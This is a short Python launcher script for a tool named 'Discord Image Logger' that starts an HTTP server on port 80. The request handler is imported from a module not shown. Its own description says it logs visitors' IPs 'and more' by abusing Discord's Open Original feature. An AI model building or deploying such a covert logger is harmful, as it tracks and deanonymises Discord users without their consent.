from http.server import HTTPServer
from handler import ImageLoggerAPI

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to log IPs and more by abusing Discord's Open Original feature"
__version__ = "v3.0"
__author__ = "DeKrypt"

if __name__ == "__main__":
    httpd = HTTPServer(("0.0.0.0", 80), ImageLoggerAPI)
    print(f"[{__app__} {__version__}] Server starting on port 80...")
    httpd.serve_forever()